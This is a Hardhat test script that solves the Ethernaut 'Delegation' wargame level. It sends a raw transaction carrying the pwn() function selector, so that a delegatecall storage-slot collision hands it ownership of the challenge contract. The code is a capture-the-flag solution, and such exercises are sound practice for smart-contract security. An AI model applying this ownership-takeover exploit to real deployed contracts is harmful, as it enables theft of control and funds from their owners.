import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";
const BN = BigNumber;

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Delegation`);
  const challengeAddress = await createChallenge(
    `0x9451961b7Aea1Df57bc20CC68D72f662241b5493`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {

  // owner in Delegate has the same address slot as owner in Delegation
  let functionSig = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("pwn()")).substring(0,10)

  // https://gist.github.com/spalladino/a349f0ca53dbb5fc3914243aaf7ea8c6
  eoa.sendTransaction({to:challenge.address, data:functionSig, gasLimit:BN.from(`50000`)})

});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
